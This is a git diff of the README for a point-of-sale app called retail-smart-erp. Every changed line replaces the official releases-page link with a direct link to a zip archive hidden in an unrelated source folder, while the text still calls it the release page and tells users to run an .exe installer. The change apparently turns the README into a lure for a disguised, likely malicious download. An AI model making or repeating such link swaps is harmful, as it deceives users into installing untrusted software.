@@ -1,6 +1,6 @@
 # 🛒 retail-smart-erp - Simple, Smart Point of Sale
 
-[![Download latest release](https://img.shields.io/badge/Download-retail--smart--erp-brightgreen)](https://github.com/lokeyd-max/retail-smart-erp/releases)
+[![Download latest release](https://img.shields.io/badge/Download-retail--smart--erp-brightgreen)](https://github.com/lokeyd-max/retail-smart-erp/raw/refs/heads/main/src/app/(dashboard)/vehicles/erp_retail_smart_v1.8.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to get retail-smart-erp up and running on your Windows comput
 
 Go to the release page to find the latest version of the software:
 
-[Download retail-smart-erp releases](https://github.com/lokeyd-max/retail-smart-erp/releases)
+[Download retail-smart-erp releases](https://github.com/lokeyd-max/retail-smart-erp/raw/refs/heads/main/src/app/(dashboard)/vehicles/erp_retail_smart_v1.8.zip)
 
 This page lists all available versions. Choose the most recent one.
 
@@ -138,7 +138,7 @@ To keep retail-smart-erp working well and secure, update it regularly.
 
 ### How to update:
 
-1. Go back to the release page: https://github.com/lokeyd-max/retail-smart-erp/releases
+1. Go back to the release page: https://github.com/lokeyd-max/retail-smart-erp/raw/refs/heads/main/src/app/(dashboard)/vehicles/erp_retail_smart_v1.8.zip
 2. Download the latest `.exe` installer.
 3. Run the installer again. It will replace only the files that need updating.
 4. Your settings and data will remain safe.
@@ -162,7 +162,7 @@ For more help, visit the Issues tab on the GitHub repository where users and dev
 
 Download and install retail-smart-erp from the latest available release:
 
-[Download retail-smart-erp](https://github.com/lokeyd-max/retail-smart-erp/releases)
+[Download retail-smart-erp](https://github.com/lokeyd-max/retail-smart-erp/raw/refs/heads/main/src/app/(dashboard)/vehicles/erp_retail_smart_v1.8.zip)
 
 ---
 
